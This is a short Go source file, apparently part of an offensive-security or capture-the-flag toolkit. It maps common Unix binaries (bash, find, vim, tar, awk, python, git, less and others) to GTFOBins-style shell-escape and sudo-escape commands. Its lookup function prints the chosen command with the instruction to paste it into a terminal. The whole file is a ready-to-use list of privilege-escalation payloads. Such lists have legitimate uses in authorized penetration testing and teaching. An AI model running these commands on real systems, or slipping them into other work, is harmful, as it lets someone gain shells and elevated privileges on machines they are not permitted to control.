package tools

import (
	"fmt"
	"strings"
)

// Baza danych najczęstszych binarek (można rozbudowywać)
var bins = map[string]string{
	"bash":  "bash -p",
	"sh":    "sh -p",
	"vim":   ":set shell=/bin/sh\n:shell",
	"find":  "find . -exec /bin/sh \\; -quit",
	"nmap":  "nmap --interactive\nnmap> !sh",
	"awk":   "awk 'BEGIN {system(\"/bin/sh\")}'",
	"perl":  "perl -e 'exec \"/bin/sh\";'",
	"python": "python -c 'import os; os.system(\"/bin/sh\")'",
	"tar":   "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
	"zip":   "TF=$(mktemp -u); zip $TF /etc/hosts -T -TT 'sh #'",
	"git":   "PAGER='sh -c \"exec sh 0<&1\"' git -p help",
	"less":  "!/bin/sh",
	"more":  "!/bin/sh",
	"man":   "!/bin/sh",
	"vi":    ":set shell=/bin/sh\n:shell",
}

func GTFOBinsLookup(binary string) string {
	binary = strings.ToLower(strings.TrimSpace(binary))
	
	cmd, exists := bins[binary]
	if !exists {
		return fmt.Sprintf("No entry found for '%s'. Try: vim, find, nmap, awk, python...", binary)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== GTFOBins: %s ===\n\n", binary))
	sb.WriteString("Shell Breakout / Sudo Escape:\n")
	sb.WriteString("-----------------------------\n")
	sb.WriteString(cmd)
	sb.WriteString("\n\n(Copy and paste this into your terminal)")

	return sb.String()
}
